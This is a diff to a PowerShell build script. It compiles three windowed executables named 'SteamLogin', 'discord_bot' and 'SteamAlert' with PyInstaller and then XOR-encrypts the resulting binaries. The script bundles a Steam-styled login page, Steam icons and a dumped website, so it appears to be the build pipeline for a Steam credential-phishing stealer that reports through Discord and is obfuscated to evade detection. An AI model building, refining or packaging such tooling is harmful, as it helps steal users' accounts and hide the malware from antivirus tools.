@@ -10,9 +10,9 @@ Remove-Item -Path "dist", "build", "SteamLogin.spec", "discord_bot.spec" -Recurs
 Remove-Item -Path "bin", "obj" -Recurse -Force -ErrorAction SilentlyContinue
 
 Write-Host "[*] Phase 2: Compiling Python modules to EXE (PyInstaller)..." -ForegroundColor Cyan
-pyinstaller --noconfirm --onefile --windowed --icon="resources\steam.ico" --name "SteamLogin" "login\main_ui.py"
-pyinstaller --noconfirm --onefile --windowed --icon="resources\discord.ico" --name "discord_bot" "websocket\discord_bot.py"
-pyinstaller --noconfirm --onefile --windowed --name "SteamAlert" "okoshko\steam_notice.py"
+pyinstaller --noconfirm --onefile --windowed --icon="login\steam.ico" --add-data "login\steam_ui.html;." --add-data "login\steam.ico;." --add-data "login\logo.png;." --add-data "login\image.png;." --collect-all webview --collect-all cryptography --noupx --name "SteamLogin" "login\main_ui.py"
+pyinstaller --noconfirm --onefile --windowed --icon="login\steam.ico" --noupx --name "discord_bot" "websocket\discord_bot.py"
+pyinstaller --noconfirm --onefile --windowed --icon="okoshko\steam.ico" --add-data "okoshko\site_dump;site_dump" --add-data "okoshko\steam.ico;." --noupx --name "SteamAlert" "okoshko\steam_notice.py"
 
 Write-Host "[*] Phase 3: Binary Encryption (Dynamic XOR)..." -ForegroundColor Cyan
 $XorKey = Get-Random -Minimum 1 -Maximum 254
